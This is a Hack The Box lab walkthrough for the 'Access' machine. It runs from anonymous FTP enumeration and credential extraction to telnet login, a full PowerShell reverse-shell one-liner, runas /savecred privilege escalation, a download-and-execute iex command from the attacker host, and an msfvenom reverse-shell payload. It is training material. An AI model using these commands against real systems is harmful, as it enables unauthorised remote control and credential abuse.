# HTB: [Access](https://www.hackthebox.com/machines/access)  
# Walkthrough: [Video](https://youtu.be/H5HNbhIzVco)

```bash
#############################################
# 1️⃣ Initial FTP Enumeration
#############################################

ftp anonymous@$IP
# Error on download → switch to binary mode
bin
get *

# Found backup.mdb (Access DB)
mdb-export backup.mdb auth_user

# Extracted credentials
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,


#############################################
# 2️⃣ Cracking Archive & Email Dump
#############################################

# .zip archive requires password
7z x backup.zip
# Password from DB: access4u@security

# Extracted .pst file
readpst file.pst
# Found telnet password: 4Cc3ssC0ntr0ller


#############################################
# 3️⃣ Telnet Access
#############################################

telnet $IP 23
login: security
password: 4Cc3ssC0ntr0ller

# Reverse shell payload
powershell -nop -w hidden -c "$client = New-Object Net.Sockets.TCPClient('10.10.14.43',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([Text.Encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}"


#############################################
# 4️⃣ Privilege Escalation
#############################################

# Method 1: cmdkey + runas
cmdkey /list
C:\Windows\System32\runas.exe /savecred /user:ACCESS\Administrator "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"

# Method 2: runas + remote PS script
runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.43/shell.ps1')"

# Method 3: msfvenom payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.43 LPORT=4444 -a x64 -f exe > shell.exe
# Upload shell.exe, then execute with runas
runas /savecred /user:ACCESS\Administrator shell.exe
```
